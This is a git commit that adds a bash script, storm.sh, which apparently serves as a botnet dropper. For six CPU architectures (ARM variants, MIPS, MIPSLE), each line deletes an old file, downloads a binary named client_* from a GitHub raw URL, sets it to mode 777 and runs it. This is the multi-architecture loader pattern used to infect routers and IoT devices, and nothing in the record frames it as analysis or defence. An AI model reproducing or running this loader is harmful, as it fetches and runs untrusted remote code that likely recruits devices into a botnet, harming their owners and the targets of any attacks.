edaca9e9b26b80901cd3a91f3139643a1a0a1a7b
Matrix2077v2 <mariataylormzi24@gmail.com>
2025-05-26 19:42:51 +0500

    Create storm.sh

---
+++ storm.sh
@@ -0,0 +1,8 @@
+#!/bin/bash
+
+rm -rf client_arm; wget https://raw.githubusercontent.com/Matrix2077v2/mcstorm/refs/heads/main/client_arm; chmod 777 client_arm; ./client_arm;
+rm -rf client_arm5; wget https://raw.githubusercontent.com/Matrix2077v2/mcstorm/refs/heads/main/client_arm5; chmod 777 client_arm5; ./client_arm5;
+rm -rf client_arm6; wget https://raw.githubusercontent.com/Matrix2077v2/mcstorm/refs/heads/main/client_arm6; chmod 777 client_arm6; ./client_arm6;
+rm -rf client_arm7; wget https://raw.githubusercontent.com/Matrix2077v2/mcstorm/refs/heads/main/client_arm7; chmod 777 client_arm7; ./client_arm7;
+rm -rf client_mips; wget https://raw.githubusercontent.com/Matrix2077v2/mcstorm/refs/heads/main/client_mips; chmod 777 client_mips; ./client_mips;
+rm -rf client_mipsle; wget https://raw.githubusercontent.com/Matrix2077v2/mcstorm/refs/heads/main/client_mipsle; chmod 777 client_mipsle; ./client_mipsle
